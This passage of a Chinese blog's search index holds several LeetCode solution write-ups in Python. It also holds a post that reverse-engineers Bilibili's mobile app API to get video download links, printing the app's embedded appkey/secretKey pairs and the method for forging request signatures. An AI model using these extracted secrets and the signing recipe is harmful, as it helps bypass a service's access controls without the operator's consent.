left + l for j in xrange(left+1, right): #由于是自下而上的动态规划，所以免去了分治法中使用递归解决子问题这一步 #coins[left] * coins[j] * coins[right] 这个表达式是指爆破最后一个气球产生的运算 dp[left][right] = max(dp[left][right], dp[left][j] + \ dp[j][right] + coins[left] * coins[j] * coins[right]) return dp[0][n-1] 这样一个比较复杂的问题就迎刃而解了，这样做的时间复杂度是O(n^3)。总结起来就是：非常暴力的方法 –&gt;简化冗余–&gt; 不那么暴力的方法 –&gt;简化冗余–&gt; 比较简单的方法 –&gt;简化冗余–&gt; 很好的方法其实这个问题我想了很久都没想出来，最后在discuss里看到这个比较好的解决方式，这个问题的思考过程也是非常值得借鉴的，所以在这里记录一下,也尽我所能讲的比较明白一些。 (溜了]]></content>
      <categories>
        <category>Leetcode</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Divide and Conquer</tag>
        <tag>Dynamic Programming</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用Python位运算简化时间/空间复杂度]]></title>
    <url>%2F2017%2F02%2F24%2Fbitwise-operation-in-leetcode%2F</url>
    <content type="text"><![CDATA[利用位运算简化算法题中的时间/空间复杂度 最近两天碰到两个用位运算解决的题目，恰好一个利用位运算简化了时间复杂度，另一个简化了空间复杂度，所以做个记录加深一下印象。第一个题目是LeetCode 421. Maximum XOR of Two Numbers in an Array:**注：这题中提到的异或均是按位异或。 Given a non-empty array of numbers, a0, a1, a2, … , an-1, where 0 ≤ ai &lt; 231. Find the maximum result of ai XOR aj, where 0 ≤ i, j &lt; n. Could you do this in O(n) runtime? Example: Input: [3, 10, 5, 25, 2, 8] Output: 28 Explanation: The maximum result is 5 ^ 25 = 28. 这题的描述中明确指出了do this in O(n) runtime ，如果要两两异或比较大小的话很明显需要O(n^2)的时间复杂度。 那怎么样才能用位运算解决这个问题呢？ 如果我们遇到的场景是这样： 假定数组中所有的元素都可以用8位2进制数来表示，如果我们已经知道所有数前7位的最大异或值maxor，怎样求8位数的最大异或值？ 很容易想到8位数的最大异或值只可能是前7位后面跟上0或1， 所以我们先假设后面能跟上1，即假设的最大异或值为 maxornew =（maxor &lt;&lt; 1）+ 1; 我们要找到这个最大异或的值会不会出现，一种简单的办法是2个循环遍历数组，然后两两算出异或的值，看是否能找到一个结果与maxornew相同。但是这样会使时间复杂度变成O(n^2)，不满足题目的要求。但是按位异或有一个比较特殊的性质： 若 x ^ y = z ,那么 x ^ z = y , y ^ z = x 这样我们只用拿出数组中每一个八位二进制数， 与maxornew进行异或运算，再判断异或得到的结果是否在数组中，如果不在的话，最大的异或值就是(maxor&lt;&lt;1) ,这样时间复杂度就被简化成为了O(n) 上面的说完了，这个题目中描述的问题也就迎刃而解了。题目中提到的numbers，由于在给出的函数声明中传入参数为List[int], LeetCode中这样的数一般认为是 32位的int。 对numbers中每一个数取前n位(1&lt;=n&lt;=32)计算最大异或的值，并且按照上面计算第八位的方法计算下一位，就可以得到整个数组的最大异或值。 12345678def findMaximumXOR(self, nums): answer = 0 for i in range(32)[::-1]: answer &lt;&lt;= 1 prefixes = &#123;num &gt;&gt; i for num in nums&#125; answer += any(answer^1 ^ p in prefixes for p in prefixes) #print bin(answer)[2:] return answer 这题利用位运算将原本需要O(n^2)的时间复杂度简化成了O(n) ============================================================================ 第二个题目是简化空间复杂度，LeetCode 137. Single Number II： Given an array of integers, every element appears three times except for one, which appears exactly once. Find that single one. Note:Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory? 就是说一个数组中，除了其中一个数只出现一次，其他都出现了三次，找出这个只出现了一次的数。首先我想到的是一个时间复杂度为O(n),使用的额外空间也是O(n)的解法： 1234567891011121314def singleNumber(self, nums): """ :type nums: List[int] :rtype: int """ numdict = &#123;&#125; for i in nums: if i in numdict: numdict[i]+=1 else: numdict[i]=1 for i in nums: if numdict[i]==1: return i 简单来说就是遍历数组的同时记录每个数出现的次数，第二次遍历的时候找出出现了一次的数。 如果要将空间复杂度简化成O(1), 使用位运算是一个很好的选择： 将所有数转换成32位的2进制表示 把每一位的值加起来对3取余 转换成十进制表示 Python将负整数转换成二进制数的时候，直接是’-‘加上这个数的绝对值的二进制表示，所以负号单独计算。代码如下： 1234567891011121314151617class Solution(object): def singleNumber(self, nums): """ :type nums: List[int] :rtype: int """ sumlist = [0]*32 summary, negcnt = 0, 0 for i in nums: negcnt += i &lt; 0 i = abs(i) bitwise = format(i, '032b') for j in xrange(32): sumlist[j] += int(bitwise[j]) for i in xrange(32): summary += 2**(31-i)*(sumlist[i]%3) return summary*[1,-1][negcnt%3] 和上面的方法比起来，额外空间简化成了常数， 即O(1)。 不过话说回来，这是一种用时间换空间的做法，上面的做法时间是2n， 这个是32n，虽然复杂度都是O(n),但是实际运行时间差距还是比较大的。 （ · x · ）~]]></content>
      <categories>
        <category>Leetcode</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Bitwise Operation</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode382 蓄水池抽样算法]]></title>
    <url>%2F2017%2F02%2F16%2FLeetCode382%2F</url>
    <content type="text"><![CDATA[LeetCode 382 解题报告 LeetCode382 蓄水池抽样算法首先说一下蓄水池抽样算法： 问题场景 给你一个长度为N的链表。N很大，但你不知道N有多大。你的任务是从这N个元素中随机取出k个元素。你只能遍历这个链表一次。你的算法必须保证取出的元素恰好有k个，且它们是完全随机的（出现概率均等）。 问题解决蓄水池抽样算法 该算法是针对从一个序列中随机抽取不重复的k个数，保证每个数被抽取到的概率为k/n这个问题而构建的。做法是： -首先构建一个可放k个元素的蓄水池，将序列的前k个元素放入蓄水池中。然后从第k+1个元素开始，以k/n的概率来决定该元素是否被替换到池子中。 当遍历完所有元素之后，就可以得到随机挑选出的k个元素。复杂度为O(n). 伪代码如下： 123456Init : a reservoir with the size： kfor i= k+1 to N M=random(1, i); if( M &lt; k) SWAP the Mth value and ith valueend for 证明每个数被取到的概率为k/n: 对于第i个数(i &lt; k), 在前k步被选中的概率是1, 从第k+1步开始, i不被选中的概率为k/k+1, 那么读到第n个数时: 第i个数(i &lt; k)被选中的概率 = 被选中的概率 * 以后每一步都不被换走的概率 即: 1 k/(k+1) (k+1)/(k+2) … (n-1)/n = k/n 对于第j个数(j &gt;= k): 被选中的概率 = 在他出现时被选中的概率 * 在他出现以后不被换走的概率 即: k/j * j/(j+1) … (n-1)/n = k/n 综上得证。 Leetcode 382 解题报告： 382. Linked List Random NodeTotal Accepted: 20928Total Submissions: 45158Difficulty: MediumContributors: AdminGiven a singly linked list, return a random node’s value from the linked list. Each node must have the same probability of being chosen. Follow up:What if the linked list is extremely large and its length is unknown to you? Could you solve this efficiently without using extra space? Example: 12345678// Init a singly linked list [1,2,3].ListNode head = new ListNode(1);head.next = new ListNode(2);head.next.next = new ListNode(3);Solution solution = new Solution(head);// getRandom() should return either 1, 2, or 3 randomly. Each element should have equal probability of returning.solution.getRandom(); 这个题就是上面所说的蓄水池长度为1的情况,Python代码如下： 12345678910111213141516171819202122232425import randomclass Solution(object): def __init__(self, head): """ @param head The linked list's head. Note that the head is guaranteed to be not null, so it contains at least one node. :type head: ListNode """ self.head = head def getRandom(self): """ Returns a random node's value. :rtype: int """ i = 1 head = self.head while head != None: M = random.randrange(0, i) if M == 0: k = head.val head = head.next i += 1 return k 由于题目中提到 What if the linked list is extremely large 而对于每个元素都要计算一次随机数, 非常耗时，所以有一个简化的版本，每100个数计算一次随机数, 代码如下： 1234567891011121314151617181920class Solution(object): def __init__(self, head): self.head = head def getRandom(self): node = self.head before = 0 buffer = [None] * 100 while node: now = 0 while node and now &lt; 100: buffer[now] = node node = node.next now += 1 r = random.randrange(now + before) if r &lt; now: pick = buffer[r] before += now return pick.val 已经做到AC率 50% 以下了, 感觉题目虽然都不是很难，但是已经开始涉及我的知识盲区了orz, 所以接下来碰到一些没学过的东西也会记录下来=。=]]></content>
      <categories>
        <category>Leetcode</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓄水池抽样</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LeetCode496 使用栈(stack)简化时间复杂度]]></title>
    <url>%2F2017%2F02%2F10%2FLeetCode496%2F</url>
    <content type="text"><![CDATA[LeetCode 496 解题报告 LeetCode 496. Next Greater Element I使用栈(stack)简化时间复杂度这道题的描述如下： 496. Next Greater Element IDescription Submission Solutions Add to ListTotal Accepted: 3176Total Submissions: 5284Difficulty: EasyContributors: love_FDU_llpYou are given two arrays (without duplicates) nums1 and nums2 where nums1’s elements are subset of nums2. Find all the next greater numbers for nums1’s elements in the corresponding places of nums2. The Next Greater Number of a number x in nums1 is the first greater number to its right in nums2. If it does not exist, output -1 for this number. Example 1:Input: nums1 = [4,1,2], nums2 = [1,3,4,2].Output: [-1,3,-1]Explanation: For number 4 in the first array, you cannot find the next greater number for it in the second array, so output -1. For number 1 in the first array, the next greater number for it in the second array is 3. For number 2 in the first array, there is no next greater number for it in the second array, so output -1.Example 2:Input: nums1 = [2,4], nums2 = [1,2,3,4].Output: [3,-1]Explanation: For number 2 in the first array, the next greater number for it in the second array is 3. For number 4 in the first array, there is no next greater number for it in the second array, so output -1.Note:All elements in nums1 and nums2 are unique.The length of both nums1 and nums2 would not exceed 1000. 这里我们假设nums1的长度是m，nums2的长度是n。看到题目第一眼，首先想到的是一个O(m*n)的解法：解法1：1234567891011121314151617181920212223def nextGreaterElement(self, findNums, nums): """ :type findNums: List[int] :type nums: List[int] :rtype: List[int] """ res = [] length = len(nums) for i in findNums: j, flag = 0, False while j &lt; length: if i == nums[j] and not flag: flag = True if flag: if j &lt; length-1 and nums[j+1] &gt; i: res.append(nums[j+1]) flag = False break if j == length - 1: res.append(-1) flag = False j += 1 return res 这个解法的想法比较直接，对nums1里的每个数，都在nums2中找到这个数，然后在接下来的数中找第一个比它大的数放到结果List里，如果没找到就把-1放进去。这个虽然也能AC把，但是runtime只能击败2.47%的人…..这样的结果明显有时间复杂度更低的解法。 然后我就去Discuss里面找了….果然…..被我找到了一个O(m+n)的解法，很巧妙地用到了栈。解法2： 123456789101112131415161718def nextGreaterElement(self, findNums, nums): """ :type findNums: List[int] :type nums: List[int] :rtype: List[int] """ d = &#123;&#125; ans = [-1] * len(findNums) for i, num in enumerate(findNums): d[num] = i stack = [] for num in nums: while stack and stack[-1] &lt; num: top = stack.pop() if top in d: ans[d[top]] = num stack.append(num) return ans 做一个简单的解释： 我们用一个字典d存储所有元素的index。 用一个与nums1等长的数组ans表示结果(并将每个元素初始化为-1) 假设我们有一个前面所有元素都递减的数列，最后一个数比前面所有的数都大，比如[5, 4, 3, 2, 1, 6]，那么6就是前面这些数的”Next Greater Element” 。 我们用一个栈来放置一个递减的数列。 每当即将入栈的一个数比栈顶的数大，我们将栈顶的数弹出，一直到即将入栈的数比栈顶的数小，这个过程中弹出的数的”Next Greater Element”就是这个入栈的数。比如：当前栈是[6,4,3,2],即将入栈的数是5，那么2，3，4会被依次弹出, 并且这三个数的”Next Greater Element”是5 我们按照上面描述的规则将nums2中的元素依次入栈，在出栈的元素中找nums1中的元素，如果有，就把ans中对应位置的元素设成即将入栈的那个数 这样我们只是遍历了一次nums1，遍历了一次nums2，时间复杂度为O(m+n) 这道题的AC率算很高的了，不过我一直都很难想到简化复杂度的方法，这题用栈解决算是比较巧妙的，姑且做个记录吧。 PS. 我竟然没到一个星期又更新了真是勤勉啊（并不=。=]]></content>
      <categories>
        <category>Leetcode</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[获取BiliBili视频下载地址]]></title>
    <url>%2F2017%2F02%2F05%2Fbilibili_download%2F</url>
    <content type="text"><![CDATA[最近在写Bilibili App的爬虫，由于bilibili是一个视频站，写爬虫很重要的一个环节就是怎样获取到视频的下载地址，所以我把如何获取B站视频下载地址做了一个简单的整理。 获取需要下载视频的av号一个常见的B站视频的链接如下： 1http://www.bilibili.com/video/av1608918/ 拿到av后面的数字，称为param 1param = &apos;1608918&apos; 获取视频信息通过抓取B站app发送的HTTP请求，可以知道获取一个视频信息的URL如下： 1https://app.bilibili.com/x/v2/view?actionKey=appkey&amp;aid=7725070&amp;appkey=27eb53fc9058f8c3&amp;build=4070&amp;device=phone&amp;from=1&amp;mobi_app=iphone&amp;platform=ios&amp;sign=3fa3c3fa6557094b5680066009b41897&amp;ts=1482977603 这个URL参数很多，接下来一一作解释。 actionKey=appkey aid=7725070 param的值 appkey=27eb53fc9058f8c3 固定 build=4070&amp;device=phone&amp;from=1&amp;mobi_app=iphone&amp;platform=ios 固定 sign=3fa3c3fa6557094b5680066009b41897 ts=1482977603 时间戳 需要我们其他参数都是现成可以获取到的，而sign这个参数是我们需要自己计算得到的，计算方法如下： (1) 将除sign外的其他参数按升序排列，得：1actionKey=appkey&amp;aid=7725070&amp;appkey=27eb53fc9058f8c3&amp;build=4070&amp;device=phone&amp;from=1&amp;mobi_app=iphone&amp;platform=ios&amp;ts=1482977603 (2) 将步骤1的结果与secretKey进行拼接 secretKey的取值（根据appKey来获取）： 12&#123;&quot;27eb53fc9058f8c3&quot;:&quot;c2ed53a74eeefe3cf99fbd01d8c9c375&quot;,&quot;q7R5WBWXdV1T5DO6&quot;:&quot;HxibjZZ04WxYn6xVS1q0pIZvxf8b2fOa&quot;&#125; 这里secretKey的值是 1c2ed53a74eeefe3cf99fbd01d8c9c375 得到结果： 1actionKey=appkey&amp;aid=7725070&amp;appkey=27eb53fc9058f8c3&amp;build=4070&amp;device=phone&amp;from=1&amp;mobi_app=iphone&amp;platform=ios&amp;ts=1482977603c2ed53a74eeefe3cf99fbd01d8c9c375 (3) 计算步骤2中得到的字符串的md5，得到13fa3c3fa6557094b5680066009b41897 这个值就是sign 经过上面的步骤，我们可以得到获取视频信息的URL，通过GET请求进行访问，会返回json格式的视频信息 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&#123; "code":0, "data":&#123; "aid":7725070, "tid":20, "tname":"宅舞", "copyright":1, "pic":"http://i1.hdslb.com/bfs/archive/e0ccafafc5ad49cea65818dcf512858cea00ed88.jpg", "title":"【黒kuromi】[963] - [ 梦与叶樱❤ ] - [fgo冲田总司cos", "pubdate":1482839192, "ctime":1482839192, "desc":"自制 翻跳 原振付，音源:sm16595856 dancer: @黒kuromi 摄影感谢:@飘雪幻幻 后期感谢:@怕怕papa ------------------------------------------------- 最近开始玩fgo~身为一个非酋真的很想抽5星呜呜！！ 樱saber太好看ww~~选了冲田总司这套跳了这个比较合适的舞xdd 希望大家看得开心&amp;gt;&amp;lt;~~感谢观看~~", "state":0, "attribute":1622016, "duration":493, "tags":[], "rights":&#123; "bp":0, "elec":1, "download":1, "movie":0, "pay":0, "hd5":0 &#125;, "owner":&#123; "mid":427657, "name":"黒クロミ", "face":"http://i2.hdslb.com/bfs/face/8ec946923ce70e990cf1b05dc3cb14bda6c0d0e0.jpg" &#125;, "stat":&#123; "view":170984, "danmaku":874, "reply":387, "favorite":5513, "coin":3277, "share":183, "now_rank":0, "his_rank":0 &#125;, "pages":[ &#123; "cid":12662538, "page":1, "from":"vupload", "link":"", "has_alias":0, "weblink":"", "part":"", "rich_vid":"", "vid":"vupload_12662538" &#125; ], "owner_ext":&#123;&#125;, "req_user":&#123;&#125;, "online":0, "tag":[], "relates":[] &#125;, "message":""&#125; 由于过于冗杂，这里只截取了一部分。其中对于视频下载真正有用的是data下面的pages的值： 123456789101112131415&#123; "pages":[ &#123; "cid":12662538, "page":1, "from":"vupload", "link":"", "has_alias":0, "weblink":"", "part":"", "rich_vid":"", "vid":"vupload_12662538" &#125; ]&#125; 看得出来这是一个列表，其实b站的CDN上面，一个较长的视频是由几个较短的视频拼接而成，还有另外一种情况就是b站视频的分P，都会使得同一个视频下面存储多个小的视频，pages就是这些小视频的列表，这些视频需要分别获得下载地址,我们关注的参数是每一个子视频的cid。 获取视频的下载地址下面的链接同样是通过抓取HTTP请求获得： 1https://interface.bilibili.com/playurl?device=phone&amp;otype=json&amp;buvid=3168fe38e580b16a02c2cc9beceaf6b7&amp;cid=12662538&amp;appkey=YvirImLGlLANCLvM&amp;platform=iphone&amp;build=4070&amp;quality=2&amp;sign=ae1954356fbd510073f636d9ca2d36e7 和上一步一样，对请求参数进行分析： device=phone 固定 otype=json 固定 buvid=3168fe38e580b16a02c2cc9beceaf6b7 固定 cid=12662538 视频的cid appkey=YvirImLGlLANCLvM 计算方法下面会介绍，但是这个参数其实可以直接固定下来。 platform=iphone固定 build=4070固定 quality=2固定 sign=ae1954356fbd510073f636d9ca2d36e7 这个值同第二步获取视频信息的sign一样需要计算 appKey的计算方式，下面是object-c代码,十分简单易懂，所以直接贴上来 1234567891011121314151617181920212223string check_tv_box(string key, int addsum) &#123; const char* sz = key.c_str(); int len = key.length(); int add = addsum; // unsigned char out[17] = &#123;0&#125;; unsigned char* out = new unsigned char[len + 1]; memset(out, 0, (len + 1) * sizeof(unsigned char)); for (int i = 0; i &lt; len; i++) &#123; int index = 0; unsigned char ch = (unsigned char)sz[i]; int num = ch + add; num = (num - 65) % 57 + 65; while (90 &lt; num &amp;&amp; 97 &gt; num) &#123; add = (index * add) + add; index ++; num = ch + add; num = (num - 65) % 57 + 65; &#125; out[i] = (unsigned char)num; &#125; string outString = (char*)out; delete [] out; return outString;&#125;string sz = "VsfoFjIDZshujsdt"; int add = 3; string out1 = check_tv_box(sz, add); appKey的初始字符串为”VsfoFjIDZshujsdt”，累加子为3，返回的out1就是加密后的字符串，即appKey的值，这里是YvirImLGlLANCLvM sign的计算方式也会用到上面的check_tv_box()函数，下面是计算sign的步骤： (1) 计算用于拼接的字符串，代码如下：123string sz2 = "zEcQEUTunrHlLvYiGXyefkmJPmDQEtow"; add = 9; string out2 = check_tv_box(sz2, add); 算法与计算appKey的算法相同，但是初始字符串为”zEcQEUTunrHlLvYiGXyefkmJPmDQEtow”，累加子为9.得到结果：JNlZNgfNGKZEpaDTkCdPQVXntXhuiJEM 注意：这个结果固定，可以直接用这个值 (2) 将其他所有参数排序1appkey=YvirImLGlLANCLvM&amp;build=4070&amp;buvid=3168fe38e580b16a02c2cc9beceaf6b7&amp;cid=12662538&amp;device=phone&amp;otype=json&amp;platform=iphone&amp;quality=2 (3) 在参数最后拼接步骤1的结果：1appkey=YvirImLGlLANCLvM&amp;build=4070&amp;buvid=3168fe38e580b16a02c2cc9beceaf6b7&amp;cid=12662538&amp;device=phone&amp;otype=json&amp;platform=iphone&amp;quality=2JNlZNgfNGKZEpaDTkCdPQVXntXhuiJEM (4) 计算步骤3结果的md5，得：1ae1954356fbd510073f636d9ca2d36e7 计算出了appKey和sign的值，就可以拼接出获取视频下载地址的URL了。发送请求可以得到返回的json信息： 12345678910111213141516171819202122&#123; "from":"local", "result":"suee", "format":"hdmp4", "timelength":493546, "accept_format":"mp4,hdmp4,flv", "accept_quality":[ 3, 2, 1 ], "seek_param":"start", "seek_type":"second", "durl":[ &#123; "order":1, "length":493546, "size":72091760, "url":" http://ws.acgvideo.com/a/2d/12662538-1-hd.mp4?wsTime=1482992010&amp;wsSecret2=de4372d19062d035396dd2625976ca1a&amp;oi=3664534074&amp;rate=2000" &#125; ]&#125; 其中durl下面的url参数就是视频下载地址了。 写了一个月的第一篇=。=终于写完了其实工作中碰到过很多app需要抓取信息，但是狠下心来写一篇总结的就只有b站23333 终于是写完了=。= 下一篇依然遥遥无期。。。。]]></content>
      <categories>
        <category>技术分享</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>bilibili</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2017，新的开始]]></title>
    <url>%2F2017%2F01%2F02%2Fhello%2F</url>
    <content type="text"><![CDATA[2017，新的开始试试用Pelican开个github page2017还是到了，总归要有点新气象 ，之前一直想要找个地方写点总结 , 一直以来都没找到好的地方，听说github好像也能开个人页面，就搞了一个玩玩233333 虽然不知道能不能坚持。。。（xD 1print 'Hello, My blog!' xixi]]></content>
      <categories>
        <category>生活记录</category>
      </categories>
      <tags>
        <tag>flag</tag>
      </tags>
  </entry>
</search>
